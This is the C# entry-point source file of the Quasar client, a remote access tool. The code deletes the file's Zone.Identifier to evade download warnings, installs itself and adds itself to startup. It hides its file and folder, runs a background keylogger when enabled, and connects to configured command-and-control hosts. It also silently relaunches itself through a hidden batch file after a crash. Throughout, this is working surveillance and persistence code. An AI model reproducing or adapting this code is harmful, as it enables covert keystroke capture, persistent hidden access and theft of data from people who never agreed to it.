﻿using Quasar.Client.Commands;
using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.Helper;
using Quasar.Client.Setup;
using Quasar.Client.IO;
using Quasar.Client.Networking;
using Quasar.Client.Utilities;
using Quasar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Quasar.Client.Messages;
using Quasar.Common.Messages;

namespace Quasar.Client
{
    internal static class Program
    {
        public static QuasarClient ConnectClient;
        private static readonly List<IMessageProcessor> MessageProcessors = new List<IMessageProcessor>();
        private static ApplicationContext _msgLoop;

        [STAThread]
        private static void Main(string[] args)
        {
            // enable TLS 1.2
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            if (Settings.Initialize())
            {
                if (Initialize())
                {
                    if (!QuasarClient.Exiting)
                        ConnectClient.Connect();
                }
            }

            Cleanup();
            Exit();
        }

        private static void Exit()
        {
            // Don't wait for other threads
            if (_msgLoop != null || Application.MessageLoop)
                Application.Exit();
            else
                Environment.Exit(0);
        }

        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.IsTerminating)
            {
                string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
                if (string.IsNullOrEmpty(batchFile)) return;

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
                Exit();
            }
        }

        private static void Cleanup()
        {
            CleanupMessageProcessors();
            CommandHandler.CloseShell();
            if (CommandHandler.StreamCodec != null)
                CommandHandler.StreamCodec.Dispose();
            if (Keylogger.Instance != null)
                Keylogger.Instance.Dispose();
            if (_msgLoop != null)
            {
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
                _msgLoop = null;
            }
            MutexHelper.CloseMutex();
        }

        private static void InitializeMessageProcessors(QuasarClient client)
        {
            MessageProcessors.Add(new ClientServicesHandler(ConnectClient));
            MessageProcessors.Add(new KeyloggerHandler());
            
            foreach(var msgProc in MessageProcessors)
                MessageHandler.Register(msgProc);
        }

        private static void CleanupMessageProcessors()
        {
            foreach (var msgProc in MessageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                msgProc.Dispose();
            }
        }

        private static bool Initialize()
        {
            var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));

            // process with same mutex is already running
            if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                return false;

            ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
            
            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);

            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
            {
                WindowsAccountHelper.StartUserIdleCheckThread();

                if (Settings.STARTUP)
                {
                    if (!Startup.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }

                if (Settings.INSTALL && Settings.HIDEFILE)
                {
                    try
                    {
                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
                        di.Attributes |= FileAttributes.Hidden;

                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.ENABLELOGGER)
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    }) {IsBackground = true}.Start();
                }

                ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                InitializeMessageProcessors(ConnectClient);
                return true;
            }
            else
            {
                MutexHelper.CloseMutex();
                new ClientInstaller().Install(ConnectClient);
                return false;
            }
        }
    }
}